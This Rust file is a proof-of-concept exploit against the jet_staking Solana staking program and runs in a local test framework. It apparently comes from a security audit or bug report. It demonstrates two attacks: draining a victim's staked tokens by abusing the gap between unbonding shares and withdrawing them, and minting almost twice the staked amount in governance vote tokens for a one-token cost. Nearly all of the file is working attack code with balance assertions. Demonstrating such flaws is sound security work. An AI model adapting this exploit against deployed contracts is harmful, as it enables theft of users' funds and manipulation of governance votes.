mod framework;
use framework::{clone_keypair, get_balance, Framework};
use std::error::Error;

use anchor_lang::AccountDeserialize;

use poc_framework::{solana_sdk::signer::Signer, Environment};

fn main() -> Result<(), Box<dyn Error>> {
    loss_of_funds()?;
    println!();
    mint_infinite_votes()?;

    Ok(())
}

fn loss_of_funds() -> Result<(), Box<dyn Error>> {
    println!("demonstrating loss of funds");
    let mut test_env = Framework::new()?;
    let attacker = clone_keypair(&test_env.attacker);
    let victim = clone_keypair(&test_env.victim);

    const VICTIM_BAL: u64 = 99;

    // setup
    test_env.init_stake_pool()?;
    test_env.create_user_auth(&attacker)?;
    test_env.create_user_auth(&victim)?;
    test_env.authenticate_user(&attacker)?;
    test_env.authenticate_user(&victim)?;
    test_env.init_stake_account(&attacker)?;
    test_env.init_stake_account(&victim)?;

    // give victim VICTIM_BAL tokens and attacker 1 token
    test_env.mint_vault_token(&attacker, 1)?;
    test_env.mint_vault_token(&victim, VICTIM_BAL)?;

    // stake the tokens
    test_env.add_stake(&attacker, 1)?;
    test_env.add_stake(&victim, VICTIM_BAL)?;

    test_env.unbond_stake_shares(&victim, 0, VICTIM_BAL)?;
    // attacker "owns" all the existing shares because the victim burned their shares already but didn't withdraw unbonded stake yet
    // this means they can unbond their stake for all the tokens
    test_env.unbond_stake_shares(&attacker, 0, 1)?;
    test_env.withdraw_unbonded_stake(&attacker, 0)?;

    println!("attempting victim withdraw.. this should fail");
    // this transaction will fail because all the tokens have been drained already
    test_env.withdraw_unbonded_stake(&victim, 0)?;

    let attacker_bal = get_balance(&test_env, &attacker, &test_env.vault_token_mint.pubkey())?;
    let victim_bal = get_balance(&test_env, &victim, &test_env.vault_token_mint.pubkey())?;
    println!("starting attacker bal: {}", 1);
    println!("starting victim bal: {}", VICTIM_BAL);
    println!("final attacker token bal: {}", attacker_bal);
    println!("final victim token bal: {}", victim_bal);
    assert!(attacker_bal == VICTIM_BAL + 1);
    assert!(victim_bal == 0);

    Ok(())
}

// this will mint BASE_AMT * 2 - 1 vote tokens, and cost 1 stake token
fn mint_infinite_votes() -> Result<(), Box<dyn Error>> {
    println!("minting votes...");

    const BASE_AMT: u64 = 10000;

    let mut test_env = Framework::new()?;
    let attacker = clone_keypair(&test_env.attacker);

    // setup
    test_env.init_stake_pool()?;
    test_env.create_user_auth(&attacker)?;
    test_env.authenticate_user(&attacker)?;
    test_env.init_stake_account(&attacker)?;

    // give attacker BASE_AMT tokens
    test_env.mint_vault_token(&attacker, BASE_AMT)?;
    test_env.add_stake(&attacker, BASE_AMT)?;

    // skew the vote share to token ratio
    test_env.unbond_stake_shares(&attacker, 0, BASE_AMT - 1)?;

    // mint votes at a bad rate
    test_env
        .env
        .create_associated_token_account(&attacker, test_env.stake_vote_mint_pubkey());
    test_env.mint_votes(&attacker, BASE_AMT * 2 - 1)?;
    test_env.withdraw_unbonded_stake(&attacker, 0)?;

    let stake_account = jet_staking::state::StakeAccount::try_deserialize(
        &mut &*test_env
            .env
            .get_account(test_env.stake_account_pubkey(&attacker))
            .unwrap()
            .data,
    )?;

    assert!(stake_account.minted_votes == BASE_AMT * 2 - 1);
    let stake_balance = get_balance(&test_env, &attacker, &test_env.vault_token_mint.pubkey())?;
    let vote_balance = get_balance(&test_env, &attacker, &test_env.stake_vote_mint_pubkey())?;

    // total cost: 1 token
    assert!(stake_balance == BASE_AMT - 1);
    assert!(vote_balance == BASE_AMT * 2 - 1);

    println!(
        "minted {} vote tokens with a cost of {} stake",
        vote_balance,
        BASE_AMT - stake_balance
    );

    Ok(())
}
